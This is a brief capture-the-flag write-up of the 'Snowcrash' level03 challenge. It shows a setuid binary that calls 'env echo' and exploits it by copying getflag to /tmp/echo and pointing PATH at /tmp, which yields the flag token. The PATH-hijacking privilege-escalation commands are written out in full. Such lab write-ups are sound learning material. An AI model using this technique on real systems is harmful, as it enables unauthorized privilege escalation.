# Snowcrash03

There's a suid binary in our home
```sh
level03:~$ ./level03
Exploit me
```


```c
iVar1 = system("/usr/bin/env echo Exploit me");
```
Looking at the code in Ghidra we see that execution uses env, maybe poison it ?
```sh
level03:~$ which getflag
/bin/getflag
level03:~$ cp /bin/getflag /tmp/echo
level03:~$ export PATH=/tmp:
level03:~$ ./level03
Check flag.Here is your token : REDACTED

```
And here it is, without getting in the flag account